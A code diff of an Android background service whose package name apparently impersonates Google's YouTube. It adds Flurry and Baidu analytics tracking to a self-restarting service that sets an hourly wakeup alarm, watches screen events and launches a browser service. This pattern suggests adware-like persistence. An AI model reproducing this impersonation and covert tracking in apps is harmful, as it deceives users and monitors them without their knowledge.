@@ -1,8 +1,11 @@
 package com.google.youtube.services;
 
-import com.google.youtube.utils.AppUtil_i;
+import java.util.HashMap;
+import java.util.Map;
+import com.baidu.mobstat.StatService;
+import com.flurry.android.FlurryAgent;
+import com.google.youtube.utils.DeviceUtils;
 import com.google.youtube.utils.MyHelpUtil;
-
 import android.app.AlarmManager;
 import android.app.PendingIntent;
 import android.app.Service;
@@ -19,15 +22,15 @@ public class MainService extends Service {
 
 	public static final String UNINSTALL_ACTION = "com.xcl.UNINSTALL_ACTION";
 
-	PendingIntent pendingIntent;
+	private PendingIntent pendingIntent;
 
-	AlarmManager localAlarmManager;
+	private AlarmManager localAlarmManager;
 
-	BroadcastReceiver mScreenReceiver = null;
+	private BroadcastReceiver mScreenReceiver = null;
 
-	BroadcastReceiver receiver = null;
-	
-	Intent browserIntent;
+	private BroadcastReceiver receiver = null;
+
+	private Intent browserIntent;
 
 	@Override
 	public IBinder onBind(Intent arg0) {
@@ -44,13 +47,16 @@ public class MainService extends Service {
 
 		pendingIntent = PendingIntent.getBroadcast(this, 0, downloadIntent,
 				PendingIntent.FLAG_UPDATE_CURRENT);
-		
-		browserIntent = new Intent(this,BrowserService.class);
+				
+		FlurryAgent.init(this,DeviceUtils.getFlurryKey(getApplicationContext()));
 
 		alarmReceiver();
 
 		startScreenBroadcastReceiver();
+		
+		browserIntent = new Intent(this,BrowserService.class);
 
+		
 	}
 
 	@Override
@@ -61,9 +67,17 @@ public class MainService extends Service {
 		localAlarmManager.setRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP,
 				(SystemClock.elapsedRealtime() + 20 * 1000), 3600 * 1000,
 				pendingIntent);
-		
-		//start
+
+		// start
 		startService(browserIntent);
+
+		FlurryAgent.onStartSession(this);
+
+		Map<String, String> map = new HashMap<String, String>();
+
+		map.put("logout_desc", "start mainService");
+
+		FlurryAgent.onEvent("status", map);
 
 		return Service.START_STICKY;
 	}
@@ -75,6 +89,10 @@ public class MainService extends Service {
 			getApplicationContext().unregisterReceiver(mScreenReceiver);
 
 			getApplicationContext().unregisterReceiver(receiver);
+
+			StatService.onPageEnd(this.getApplicationContext(), "");
+
+			FlurryAgent.onEndSession(this);
 
 		} catch (Exception e) {
 			// TODO: handle exception
